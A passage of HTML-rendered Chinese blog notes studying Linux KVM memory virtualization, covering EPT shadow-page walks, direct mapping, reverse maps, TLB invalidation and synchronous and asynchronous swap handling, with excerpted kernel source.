class=\"params\">\t\t\t     <span class=\"keyword\">struct</span> kvm_vcpu *vcpu, u64 addr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\titerator-&gt;addr = addr;</span><br><span class=\"line\">\titerator-&gt;shadow_addr = vcpu-&gt;arch.mmu.root_hpa;</span><br><span class=\"line\">\titerator-&gt;level = vcpu-&gt;arch.mmu.shadow_root_level;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">shadow_walk_okay</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (iterator-&gt;level &lt; PT_PAGE_TABLE_LEVEL)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\titerator-&gt;index = SHADOW_PT_INDEX(iterator-&gt;addr, iterator-&gt;level);</span><br><span class=\"line\">\titerator-&gt;sptep\t= ((u64 *)__va(iterator-&gt;shadow_addr)) + iterator-&gt;index;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">shadow_walk_next</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__shadow_walk_next(iterator, *iterator-&gt;sptep);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __shadow_walk_next(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator,</span><br><span class=\"line\">\t\t\t       u64 spte)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_last_spte(spte, iterator-&gt;level)) &#123;</span><br><span class=\"line\">\t\titerator-&gt;level = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\titerator-&gt;shadow_addr = spte &amp; PT64_BASE_ADDR_MASK;</span><br><span class=\"line\">\t--iterator-&gt;level;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于页表项和EPT基地址都记录的是物理地址，即HPA，这里访问都需要先转成虚拟地址即HVA来使用。</p>\n<h3 id=\"加入映射\"><a href=\"#加入映射\" class=\"headerlink\" title=\"加入映射\"></a>加入映射</h3><p><a href=\"https://blog.csdn.net/leoufung/article/details/52661968\">__direct_map 函数解析之影子页表的构建_direct map_leoufung的博客-CSDN博客</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __direct_map(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> gpa, <span class=\"type\">int</span> write,</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> map_writable, <span class=\"type\">int</span> level, <span class=\"type\">kvm_pfn_t</span> pfn,</span><br><span class=\"line\">\t\t\t<span class=\"type\">bool</span> prefault, <span class=\"type\">bool</span> lpage_disallowed)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_shadow_walk_iterator</span> <span class=\"title\">it</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\">\t<span class=\"type\">gfn_t</span> gfn = gpa &gt;&gt; PAGE_SHIFT;</span><br><span class=\"line\">\t<span class=\"type\">gfn_t</span> base_gfn = gfn;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!VALID_PAGE(vcpu-&gt;arch.mmu.root_hpa))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\">\ttrace_kvm_mmu_spte_requested(gpa, level, pfn);</span><br><span class=\"line\">\tfor_each_shadow_entry(vcpu, gpa, it) &#123;</span><br><span class=\"line\">\t\tdisallowed_hugepage_adjust(it, gfn, &amp;pfn, &amp;level);</span><br><span class=\"line\">\t\tbase_gfn = gfn &amp; ~(KVM_PAGES_PER_HPAGE(it.level) - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (it.level == level)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\tdrop_large_spte(vcpu, it.sptep);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!is_shadow_present_pte(*it.sptep)) &#123;</span><br><span class=\"line\">\t\t\tsp = kvm_mmu_get_page(vcpu, base_gfn, it.addr,</span><br><span class=\"line\">\t\t\t\t\t      it.level - <span class=\"number\">1</span>, <span class=\"literal\">true</span>, ACC_ALL);</span><br><span class=\"line\">\t\t\tlink_shadow_page(vcpu, it.sptep, sp);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (lpage_disallowed)</span><br><span class=\"line\">\t\t\t\taccount_huge_nx_page(vcpu-&gt;kvm, sp);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tret = mmu_set_spte(vcpu, it.sptep, ACC_ALL,</span><br><span class=\"line\">\t\t\t   write, level, base_gfn, pfn, prefault,</span><br><span class=\"line\">\t\t\t   map_writable);</span><br><span class=\"line\">\tdirect_pte_prefetch(vcpu, it.sptep);</span><br><span class=\"line\">\t++vcpu-&gt;stat.pf_fixed;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>kvm_mmu_get_page</code>在不存在的情况下创建欣的页表页，<code>link_shadow_page</code>连接两级页表，<code>mmu_set_spte</code>在最后一级页表填入HPA</p>\n<p>遍历页表的循环动态补全了GPA对应的页表页，最后写入映射到HPA的页表项</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">rmap_add</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, u64 *spte, <span class=\"type\">gfn_t</span> gfn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_rmap_head</span> *<span class=\"title\">rmap_head</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsp = page_header(__pa(spte));</span><br><span class=\"line\">\tkvm_mmu_page_set_gfn(sp, spte - sp-&gt;spt, gfn);</span><br><span class=\"line\">\trmap_head = gfn_to_rmap(vcpu-&gt;kvm, gfn, sp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pte_list_add(vcpu, spte, rmap_head);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>并且会加入反向映射</p>\n<p><code>mmu_set_spte</code>-&gt;<code>kvm_flush_remote_tlbs</code>-&gt;<code>kvm_make_all_cpus_request(kvm, KVM_REQ_TLB_FLUSH)</code></p>\n<p><code>vcpu_enter_guest</code>-&gt;<code>kvm_vcpu_flush_tlb</code>-&gt;<code>vmx_flush_tlb</code>-&gt;<code>__vmx_flush_tlb</code>-&gt;<code>ept_sync_context(construct_eptp(vcpu, vcpu-&gt;arch.mmu.root_hpa));</code>-&gt;<code>__invept</code></p>\n<p>最后用到VMX的<code>INVEPT</code>指令 手册<code>28.3.3.4 Guidelines for Use of the INVEPT Instruction</code></p>\n<blockquote>\n<p> the INVEPT instruction to invalidate information cached from the  EPT paging structures.</p>\n</blockquote>\n<p>tlb存的是GVA-&gt;HPA 还是HVA-&gt;HPA不确定，和VMX在硬件上的具体实现有关，所以需要特殊VMX指令而不是普通flush tlb的指令例如<code>invlpg</code>而是仍然需要使用VMX扩展指令？</p>\n<h2 id=\"swap\"><a href=\"#swap\" class=\"headerlink\" title=\"swap\"></a>swap</h2><p><a href=\"https://zhuanlan.zhihu.com/p/588911110\">linux内核源码解析- 匿名页面生命周期 - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://www.openeuler.org/en/blog/liqunsheng/2020-11-26-swap.html\">Linux 中的内存交换 (openeuler.org)</a></p>\n<p><a href=\"https://www.cnblogs.com/LoyenWang/p/11827153.html\">【原创】（十）Linux内存管理 - zoned page frame allocator - 5 - LoyenWang - 博客园 (cnblogs.com)</a></p>\n<p>[<a href=\"https://blog.csdn.net/u010923083/article/details/116278456\">内核内存] [arm64] 内存回收4—shrink_node函数详解_shrink函数_早起的虫儿有鹰吃的博客-CSDN博客</a></p>\n<h3 id=\"swap-out\"><a href=\"#swap-out\" class=\"headerlink\" title=\"swap out\"></a>swap out</h3><p>mm&#x2F;vmscan.c <code>shrink_page_list</code> 高版本<code>shrink_folio_list</code></p>\n<p><code>shrink_page_list</code>-&gt;<code>rmap_walk</code>-&gt;<code>try_to_unmap_one</code> -&gt; <code>mmu_notifier_invalidate_range_start</code></p>\n<p>解映射(内核自己的  还有通知KVM EPT的)</p>\n<p><code>kvm_unmap_hva_range</code> <code>kvm_handle_hva_range</code> <code>kvm_unmap_rmapp</code> <code>kvm_zap_rmapp</code> <code>rmap_get_first</code> <code>drop_spte ``rmap_remove</code> <code>pte_list_remove</code></p>\n<p><code>page_vma_mapped_walk</code> 根据page结构体存的信息拿到对应的vma 再遍历页表拿到pte 最后unmap pte</p>\n<p><code>shrink_page_list</code>-&gt;<code>pageout</code> 写磁盘</p>\n<p>内核为了节约空间 先找VMA 再找pte 但是kvm是直接维护的spte</p>\n<p><img src=\"http://jake.dothome.co.kr/wp-content/uploads/2017/01/do_swap_page-1a.png\" alt=\"image\"></p>\n<p>[Linux中的Anonymous Pages和Swap <a href=\"https://zhuanlan.zhihu.com/p/70964551\">一] - 知乎 (zhihu.com)</a></p>\n<p>[Qemu-kvm memory 虚拟化 | Tian-Daye on the Way (xingguotian.github.io)](<a href=\"https://xingguotian.github.io/2019/08/23/qemu-kvm\">https://xingguotian.github.io/2019/08/23/qemu-kvm</a> 内存虚拟化&#x2F;)</p>\n<p><a href=\"http://www.wowotech.net/memory_management/reverse_mapping.html\">逆向映射的演进 (wowotech.net)</a></p>\n<p>建立反向映射：<a href=\"https://www.codenong.com/cs106477291/\">5. EPT机制 | 码农家园 (codenong.com)</a></p>\n<p>KVM的EPT维护一个rmap 反向映射</p>\n<p>KVM启动先向内核mm模块注册一个回调函数，内核发生swap会通知KVM处理</p>\n<p>解开反向映射：<a href=\"https://www.openeuler.org/en/blog/liqunsheng/2020-11-26-swap.html\">Linux 中的内存交换 (openeuler.org)</a></p>\n<h3 id=\"swap-in\"><a href=\"#swap-in\" class=\"headerlink\" title=\"swap in\"></a>swap in</h3><p><code>do_swap_page</code>-&gt;<code>do_wp_page</code>-&gt;<code>wp_page_copy</code>-&gt;<code>set_pte_at_notify</code>-&gt;<code>mmu_notifier_change_pte</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//mm/memory.c</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __handle_mm_fault(<span class=\"keyword\">struct</span> vm_area_struct *vma, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> address,</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_fault</span> <span class=\"title\">vmf</span> =</span> &#123;</span><br><span class=\"line\">\t\t.vma = vma,</span><br><span class=\"line\">\t\t.address = address &amp; PAGE_MASK,</span><br><span class=\"line\">\t\t.flags = flags,</span><br><span class=\"line\">\t\t.pgoff = linear_page_index(vma, address),</span><br><span class=\"line\">\t\t.gfp_mask = __get_fault_gfp_mask(vma),</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mm_struct</span> *<span class=\"title\">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class=\"line\">\t<span class=\"type\">pgd_t</span> *pgd;</span><br><span class=\"line\">\t<span class=\"type\">p4d_t</span> *p4d;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\">\tpgd = pgd_offset(mm, address);</span><br><span class=\"line\">\tp4d = p4d_alloc(mm, pgd, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!p4d)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> VM_FAULT_OOM;</span><br><span class=\"line\">\tvmf.pud = pud_alloc(mm, p4d, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!vmf.pud)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> VM_FAULT_OOM;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\tvmf.pmd = pmd_alloc(mm, vmf.pud, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!vmf.pmd)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> VM_FAULT_OOM;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> handle_pte_fault(&amp;vmf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_pte_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> vm_fault *vmf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    vmf-&gt;pte = pte_offset_map(vmf-&gt;pmd, vmf-&gt;address);</span><br><span class=\"line\">    vmf-&gt;orig_pte = *vmf-&gt;pte;</span><br><span class=\"line\"> \t<span class=\"keyword\">if</span> (!pte_present(vmf-&gt;orig_pte))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> do_swap_page(vmf);   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pte_offset_map(dir,addr) pte_offset(dir, addr)</span></span><br><span class=\"line\">Expands to:</span><br><span class=\"line\">((<span class=\"type\">pte_t</span> *)(((((((*vmf-&gt;pmd).pud).pgd))) &amp; (~(((<span class=\"number\">1UL</span>) &lt;&lt; (<span class=\"number\">13</span>))<span class=\"number\">-1</span>)))) + (((vmf-&gt;address) &gt;&gt; <span class=\"number\">13</span>) &amp; (((<span class=\"number\">1UL</span>) &lt;&lt; ((<span class=\"number\">21</span> - <span class=\"number\">13</span>))) - <span class=\"number\">1</span>)))</span><br><span class=\"line\"><span class=\"comment\">//arch/arc/include/asm/pgtable.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pte_present(x)\t\t\t(pte_val(x) &amp; _PAGE_PRESENT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _PAGE_PRESENT       (1&lt;&lt;10)\t<span class=\"comment\">/* TLB entry is valid (H) */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>虽然代码注释说的是TLB是否有效，但是<a href=\"https://www.kernel.org/doc/gorman/html/understand/understand006.html#3.1\">Page Table Management (kernel.org)</a>这个链接提到这个bit的意思是</p>\n<blockquote>\n<p> Page is resident in memory and not swapped out</p>\n</blockquote>\n<p>EPT并不是根据pte的bit判断swap，而是直接调用mm模块去处理，或者async直接返回用户态，挂起vcpu。</p>\n<p><a href=\"https://xingguotian.github.io/\">Tian-Daye on the Way (xingguotian.github.io)</a></p>\n<p><a href=\"https://blog.csdn.net/qiongtianliuyun/article/details/108295111\">Qemu-kvm memory 虚拟化_Cliff Yang的博客-CSDN博客</a></p>\n<blockquote>\n<p>调用hva_to_pfn时，如果这个函数判断是新分配的内存页，则表明该gfn到pfn的映射并未建立，如果内存页被交换到了磁盘上，则会设置async为true，这样tdp_page_fault就会成功返回，并将当前VCPU线程挂起来。——《QEMUKVM源码解析与应用》</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">kvm_pfn_t</span> <span class=\"title function_\">hva_to_pfn</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">bool</span> atomic, <span class=\"type\">bool</span> *async,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"type\">bool</span> write_fault, <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_area_struct</span> *<span class=\"title\">vma</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> npages, r;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hva_to_pfn_fast(addr, atomic, async, write_fault, writable, &amp;pfn))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tnpages = hva_to_pfn_slow(addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tdown_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == -EHWPOISON ||</span><br><span class=\"line\">\t      (!async &amp;&amp; check_user_page_hwpoison(addr))) &#123;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_HWPOISON;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> <span class=\"built_in\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">retry:</span><br><span class=\"line\">\tvma = find_vma_intersection(current-&gt;mm, addr, addr + <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vma == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vma-&gt;vm_flags &amp; (VM_IO | VM_PFNMAP)) &#123;</span><br><span class=\"line\">\t\tr = hva_to_pfn_remapped(vma, addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r == -EAGAIN)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> retry;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (async &amp;&amp; vma_is_valid(vma, write_fault))</span><br><span class=\"line\">\t\t\t*async = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"built_in\">exit</span>:</span><br><span class=\"line\">\tup_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch14lev1sec2.html\">Memory Areas (gigatux.nl)</a><code>VM_IO</code>表示</p>\n<blockquote>\n<p>The area maps a device’s I&#x2F;O space</p>\n</blockquote>\n<p>这里async传入指针，有两个作用</p>\n<ol>\n<li>指针空或非空表示是否支持async，指导内层函数</li>\n<li>如果指针非空，true&#x2F;false表示是否需要async(例如swap0，指导外层函数)</li>\n</ol>\n<p><code>hva_to_pfn_slow</code>-&gt;<code>get_user_page_nowait</code>-&gt;<code>get_user_pages</code>-&gt;<code>__get_user_pages</code> -&gt;<code>faultin_page</code>-&gt;<code>handle_mm_fault</code>-&gt;<code>__handle_mm_fault</code>-&gt;<code>handle_pte_fault</code>-&gt;<code>do_swap_page</code></p>\n<p>这里是同步处理swap</p>\n<p>下面是异步处理swap</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">try_async_pf</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">bool</span> prefault, <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">gpa_t</span> cr2_or_gpa, <span class=\"type\">kvm_pfn_t</span> *pfn, <span class=\"type\">bool</span> write,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!prefault &amp;&amp; kvm_can_do_async_pf(vcpu)) &#123;</span><br><span class=\"line\">\t\ttrace_kvm_try_async_get_page(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_find_async_pf_gfn(vcpu, gfn)) &#123;</span><br><span class=\"line\">\t\t\ttrace_kvm_async_pf_doublefault(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t\tkvm_make_request(KVM_REQ_APF_HALT, vcpu);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (kvm_arch_setup_async_pf(vcpu, cr2_or_gpa, gfn))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*pfn = __gfn_to_pfn_memslot(slot, gfn, <span class=\"literal\">false</span>, <span class=\"literal\">NULL</span>, write, writable);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//include/linux/kvm_host.h</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">kvm_make_request</span><span class=\"params\">(<span class=\"type\">int</span> req, <span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsmp_wmb();</span><br><span class=\"line\">\tset_bit(req &amp; KVM_REQUEST_MASK, &amp;vcpu-&gt;requests);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果vm支持async，直接返回，不处理；否则再调用一次<code>gfn_to_pfn</code>并不支持async强制同步swap</p>\n<p>kvm_make_request对当前vcpu有作用，例如挂起</p>\n<p><a href=\"https://www.kernel.org/doc/html/v4.15/virtual/kvm/vcpu-requests.html\">KVM VCPU Requests — The Linux Kernel documentation</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">tdp_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> gpa, u32 error_code,<span class=\"type\">bool</span> prefault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (try_async_pf(vcpu, prefault, gfn, gpa, &amp;pfn, write, &amp;map_writable))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa, u64 error_code,</span></span><br><span class=\"line\"><span class=\"params\">\t\t       <span class=\"type\">void</span> *insn, <span class=\"type\">int</span> insn_len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tr = vcpu-&gt;arch.mmu.page_fault(vcpu, cr2_or_gpa,</span><br><span class=\"line\">\t\t\t\t\t       lower_32_bits(error_code),<span class=\"literal\">false</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r == RET_PF_RETRY)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_violation</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">gpa_t</span> gpa=vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> kvm_mmu_page_fault(vcpu, gpa, error_code, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vmx_handle_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (exit_reason &lt; kvm_vmx_max_exit_handlers</span><br><span class=\"line\">\t    &amp;&amp; kvm_vmx_exit_handlers[exit_reason])</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_vmx_exit_handlers[exit_reason](vcpu);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (kvm_request_pending(vcpu)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (kvm_check_request(KVM_REQ_APF_HALT, vcpu)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* Page is swapped out. Do synthetic halt */</span></span><br><span class=\"line\">            vcpu-&gt;arch.apf.halted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            r = <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">   \t\t...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    r = kvm_mmu_reload(vcpu);</span><br><span class=\"line\">    kvm_x86_ops-&gt;run(vcpu);</span><br><span class=\"line\">    r = kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm</span> *<span class=\"title\">kvm</span> =</span> vcpu-&gt;kvm;</span><br><span class=\"line\">\tvcpu-&gt;srcu_idx = srcu_read_lock(&amp;kvm-&gt;srcu);</span><br><span class=\"line\">\tvcpu-&gt;arch.l1tf_flush_l1d = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_vcpu_running(vcpu)) &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_enter_guest(vcpu);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_block(kvm, vcpu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsrcu_read_unlock(&amp;kvm-&gt;srcu, vcpu-&gt;srcu_idx);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_arch_vcpu_ioctl_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_run *kvm_run)</span></span><br><span class=\"line\">&#123;</span><br><span 